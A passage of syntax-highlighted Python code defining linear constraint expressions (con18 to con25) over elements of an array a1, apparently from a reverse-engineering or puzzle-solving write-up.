</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">31190</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">244002</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">81415</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">22940</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">126076</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">8932</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">112153</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">194218</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">197656</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">204463</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">219500</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">19777</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">24531260</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con18 <span style="color:#f92672">=</span> <span style="color:#ae81ff">279969</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">123977</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">162094</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">215769</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">18878</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">14</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">80292</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">237675</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">222121</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">269381</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">153934</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">13</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">165380</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">157137</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">186748</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">170756</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">186932</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">87264470</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con19 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">87190</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">74836</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">16892</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">185781</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">12726</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">85022</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">232989</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">68516</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">120254</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">204892</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">65901</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">201087</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">13</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">158612</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">49445</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">181860</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">14</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">111015</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">15</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">43646834</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con20 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">170184</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">137671</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">85374</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">73658</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">230891</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">13</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">54346</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">15</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">280694</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">60411</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">27171</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">50618</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">11843</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">131778</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">13956</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">42562</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">19972</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">145797</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">14</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">58717</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">16</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">74613584</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>con21 <span style="color:#f92672">=</span> <span style="color:#ae81ff">242475</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">16</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">234385</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">124653</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">287929</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">13</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">190916</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">277578</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">39</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">41625</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">67262</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">250144</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">70886</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">223492</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">15</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">179651</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">206538</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">17</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">161965</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">146258</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">167068</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">196330</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">14</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">76353817</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con22 <span style="color:#f92672">=</span> <span style="color:#ae81ff">29700</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">18</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">60542</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">274107</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">154914</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">13</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">143185</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">167424</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">137439</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">186151</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">77157</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">233090</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">27400</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">76557</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">15</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">108002</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">17</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">103161</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">14</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">133956</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">219502</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">202897</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">250957</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">119297</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">16</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">100812197</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>con23 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">171971</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">38740</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">31661</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">194653</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">18</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">295910</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">16</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">136489</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">212619</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">17</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">165592</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">211791</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">156909</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">232187</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">73709</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">79735</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">14</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">184882</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">13</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">111105</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">148840</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">35774</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">19</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">275711</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">135265</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">141221</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">15</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">39117122</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con24 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">186514</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">17</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">7791</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">276755</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">294815</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">14</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">238763</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">15</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">146099</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">184977</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">16</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">178413</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">287303</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">71946</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">73771</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">129032</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">18</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">200202</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">20</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">150509</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">156625</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">13</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">14093</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">192584</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">122770</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">255494</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">108479</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">19</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">13521895</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>con25 <span style="color:#f92672">=</span> <span style="color:#ae81ff">210978</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">300336</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">207254</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">15</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">216206</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">63529</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">274903</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">10750</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">14</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">25008</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">100942</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">19</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">104857</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">266501</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">229070</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">17</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">234559</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">16</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">298459</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">172052</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">98938</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">66155</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">13</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">84761</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">283508</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">18</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">288577</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">21</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">75407</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">20</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">204447</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">4351595</span>
</span></span><span style="display:flex;"><span>
